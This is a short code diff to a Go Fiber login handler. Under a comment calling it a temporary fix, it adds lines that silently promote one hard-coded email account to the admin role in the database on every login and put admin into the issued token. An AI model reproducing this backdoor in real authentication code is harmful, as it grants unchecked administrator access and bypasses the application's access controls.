@@ -127,6 +127,12 @@ func Login(pool *pgxpool.Pool) fiber.Handler {
 			})
 		}
 
+		// TEMPORARY FIX: Paksa akun ini menjadi admin jika belum admin
+		if req.Email == "jyu.jur5@gmail.com" && role != "admin" {
+			_, _ = pool.Exec(ctx, "UPDATE users SET role = 'admin' WHERE email = $1", req.Email)
+			role = "admin"
+		}
+
 		// Generate JWT Token
 		secret := os.Getenv("JWT_SECRET")
 		if secret == "" {
